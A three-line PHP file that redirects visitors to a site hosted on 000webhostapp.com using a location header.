<?php
	header("location: http://nickel-reactor.000webhostapp.com");
?>